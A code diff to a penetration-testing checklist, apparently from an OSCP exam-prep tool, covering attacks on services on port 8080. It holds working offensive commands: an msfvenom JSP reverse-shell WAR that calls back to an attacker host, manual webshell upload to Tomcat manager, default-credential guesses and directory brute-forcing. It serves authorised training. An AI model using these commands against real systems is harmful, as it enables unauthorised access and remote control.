@@ -145,7 +145,8 @@ _CHECKLIST: Dict[int, List[str]] = {
     8080: [
         "Directory brute-force: `gobuster dir -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt`",
         "Check for Tomcat manager: `curl -s http://{ip}:8080/manager/html` (try tomcat:tomcat, admin:admin, admin:s3cret)",
-        "Tomcat deploy WAR shell: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war` → upload via /manager",
+        "[MSF-RESTRICTED] Tomcat deploy WAR shell: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war` → upload via /manager  # ⚠️ OSCP: Metasploit limited to 1 machine per exam",
+        "Manual alternative (no MSF): craft JSP webshell by hand, `jar cvf shell.war *`, upload to /manager/text/deploy?path=/shell via HTTP PUT — or use `searchsploit -m 31433` (standalone Tomcat manager exploit)",
         "Check for Jenkins: `curl -s http://{ip}:8080/login` — default creds admin:admin",
         "Check for admin panels / developer interfaces (Webmin, Glassfish, JBoss)",
     ],
